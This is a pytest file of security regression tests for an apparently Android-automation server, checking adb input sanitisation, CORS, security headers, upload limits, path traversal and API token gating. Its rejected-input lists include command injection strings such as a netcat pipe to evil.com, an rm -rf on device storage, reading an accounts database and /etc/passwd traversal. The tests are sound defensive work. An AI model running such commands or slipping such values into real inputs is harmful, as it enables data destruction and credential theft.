# Copyright 2026 MusePilot Authors
# Licensed under the Apache License, Version 2.0
"""Security regression tests verifying Meta-standard enterprise hardening."""

from __future__ import annotations

import io
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from starlette.testclient import TestClient

from musepilot.config import MusePilotSettings
from musepilot.execution.device import (
    AdbDeviceDriver,
    DeviceDispatchError,
    validate_adb_serial,
)
from musepilot.server.app import create_app
from musepilot.trace.recorder import TraceStore


@pytest.fixture
def mock_adb_env(monkeypatch: pytest.MonkeyPatch):
    """Enable live input and mock adb binary resolution."""
    monkeypatch.setenv("MUSEPILOT_ALLOW_LIVE_INPUT", "true")
    monkeypatch.setattr("musepilot.execution.device._find_adb", lambda: "/usr/local/bin/adb")


def test_adb_shell_text_injection_prevented(mock_adb_env):
    """Ensure shell metacharacters cannot be injected into remote adb shell."""
    driver = AdbDeviceDriver(serial="emulator-5554")
    driver._run = MagicMock()

    # Dangerous shell injection payloads that must be rejected
    injection_payloads = [
        "hello; rm -rf /sdcard/*",
        "foo | nc evil.com 4444",
        "$(cat /data/system/users/0/accounts.db)",
        "`whoami`",
        "echo 'pwned'",
        'echo "pwned"',
        "test & background_job",
        "redirect > /sdcard/leak.txt",
        "input < /sdcard/exploit.bin",
        "multi\nline\ncommand",
        "escape\\character",
    ]

    for payload in injection_payloads:
        with pytest.raises(DeviceDispatchError) as exc_info:
            driver.text(payload)
        assert "forbidden shell metacharacters" in str(exc_info.value)
        driver._run.assert_not_called()

    # Safe text inputs must be permitted and space-escaped per adb conventions
    safe_payloads = [
        ("Hello World", "Hello%sWorld"),
        ("Value=100%", "Value=100%25"),
        ("user@internal.meta.com", "user@internal.meta.com"),
        ("slider-50", "slider-50"),
        ("status:ok", "status:ok"),
    ]
    for text_in, expected_arg in safe_payloads:
        driver._run.reset_mock()
        driver.text(text_in)
        driver._run.assert_called_once_with("shell", "input", "text", expected_arg)


def test_adb_serial_flag_injection_prevented():
    """Ensure device serial parameter cannot inject CLI flags or shell separators."""
    invalid_serials = [
        "-d",
        "--help",
        "-s",
        "emulator-5554; reboot",
        "emulator-5554 | sh",
        "device with spaces",
        "",
        "   ",
        "-option=attack",
    ]
    for bad_serial in invalid_serials:
        with pytest.raises(ValueError):
            validate_adb_serial(bad_serial)

    # Valid serials must pass through
    assert validate_adb_serial("emulator-5554") == "emulator-5554"
    assert validate_adb_serial("192.168.1.100:5555") == "192.168.1.100:5555"
    assert validate_adb_serial("RFC8282_A1") == "RFC8282_A1"


def test_security_headers_injected_on_all_responses():
    """Verify Meta-standard defense-in-depth headers are injected on HTTP responses."""
    app = create_app()
    client = TestClient(app)
    response = client.get("/api/health")

    assert response.status_code == 200
    assert response.headers.get("x-content-type-options") == "nosniff"
    assert response.headers.get("x-frame-options") == "SAMEORIGIN"
    assert response.headers.get("referrer-policy") == "strict-origin-when-cross-origin"
    assert response.headers.get("x-xss-protection") == "1; mode=block"
    assert "accelerometer=()" in response.headers.get("permissions-policy", "")
    assert "default-src 'self'" in response.headers.get("content-security-policy", "")


def test_cors_origin_restriction():
    """Verify CORS policy restricts cross-origin access to configured whitelist."""
    custom_settings = MusePilotSettings(
        allowed_origins=["http://localhost:8501", "http://internal.company.net"]
    )
    app = create_app(settings=custom_settings)
    client = TestClient(app)

    # 1. Untrusted origin must NOT receive allow-origin header
    response = client.options(
        "/api/runs",
        headers={
            "Origin": "http://evil-attacker.com",
            "Access-Control-Request-Method": "POST",
        },
    )
    assert response.headers.get("access-control-allow-origin") != "http://evil-attacker.com"
    assert response.headers.get("access-control-allow-origin") != "*"

    # 2. Trusted origin receives allow-origin header
    response = client.options(
        "/api/runs",
        headers={
            "Origin": "http://localhost:8501",
            "Access-Control-Request-Method": "POST",
        },
    )
    assert response.headers.get("access-control-allow-origin") == "http://localhost:8501"


def test_audio_upload_size_limit_rejection(tmp_path: Path):
    """Verify audio uploads exceeding max_upload_bytes are rejected with 413."""
    custom_settings = MusePilotSettings(
        max_upload_bytes=1024 * 1024,  # Tight 1MB cap for testing
        api_token="",
        jwt_secret="",
        jwt_token="",
    )
    app = create_app(settings=custom_settings)
    client = TestClient(app)

    # Oversized payload
    oversized_data = b"RIFF" + b"\x00" * (1024 * 1024 + 100)
    files = {"audio": ("recording.wav", io.BytesIO(oversized_data), "audio/wav")}
    response = client.post("/api/voice/transcribe", files=files, data={"workflow_id": "w2"})
    assert response.status_code == 413
    assert "exceeds maximum allowed size" in response.json()["detail"]

    # Empty payload
    empty_files = {"audio": ("recording.wav", io.BytesIO(b""), "audio/wav")}
    response = client.post("/api/voice/transcribe", files=empty_files, data={"workflow_id": "w2"})
    assert response.status_code == 400
    assert "empty" in response.json()["detail"]


def test_trace_id_glob_and_traversal_sanitization(tmp_path: Path):
    """Verify trace lookup rejects glob wildcards and directory traversal tokens."""
    store = TraceStore(trace_dir=tmp_path)

    # Glob wildcards must return None, not match arbitrary traces
    assert store.find_trace("*") is None
    assert store.find_trace("?*") is None
    assert store.find_trace("[a-z]") is None

    # Path traversal patterns must return None
    assert store.find_trace("../../../../etc/passwd") is None
    assert store.find_trace("..\\..\\windows\\system32") is None

    # Server endpoint must return HTTP 400 for invalid trace ID syntax
    app = create_app()
    client = TestClient(app)
    response = client.get("/api/traces/*")
    assert response.status_code == 400
    assert "Invalid trace_id" in response.json()["detail"]

    response = client.get("/api/states?trace_id=../../traversal")
    assert response.status_code == 400
    assert "Invalid trace_id" in response.json()["detail"]


def test_api_token_auth_enforcement():
    """Verify optional enterprise API token gate protects API and WebSocket."""
    custom_settings = MusePilotSettings(api_token="meta_secure_token_12345")
    app = create_app(settings=custom_settings)
    client = TestClient(app)

    # 1. Unauthenticated request to /api/runs must return 401
    resp = client.post("/api/runs", json={"workflow_id": "w1"})
    assert resp.status_code == 401
    assert "Unauthorized" in resp.json()["detail"]

    # 2. Invalid token must return 401
    resp = client.post(
        "/api/runs",
        json={"workflow_id": "w1"},
        headers={"Authorization": "Bearer invalid_secret"},
    )
    assert resp.status_code == 401

    mock_trace = MagicMock()
    mock_trace.model_dump.return_value = {"trace_id": "mock_auth_trace", "status": "COMPLETED"}

    # 3. Valid Bearer token passes auth gate
    with patch("musepilot.server.app._execute_run_blocking") as mock_exec:
        mock_exec.return_value = mock_trace
        resp = client.post(
            "/api/runs",
            json={"workflow_id": "w1"},
            headers={"Authorization": "Bearer meta_secure_token_12345"},
        )
        assert resp.status_code == 200
        assert resp.json()["status"] == "COMPLETED"

    # 4. Valid X-API-Key header passes auth gate
    with patch("musepilot.server.app._execute_run_blocking") as mock_exec:
        mock_exec.return_value = mock_trace
        resp = client.post(
            "/api/runs",
            json={"workflow_id": "w1"},
            headers={"X-API-Key": "meta_secure_token_12345"},
        )
        assert resp.status_code == 200
        assert resp.json()["status"] == "COMPLETED"

    # 5. WebSocket without token rejected
    with client.websocket_connect("/ws/runs") as ws:
        msg = ws.receive_json()
        assert msg["type"] == "error"
        assert "Unauthorized" in msg["detail"]
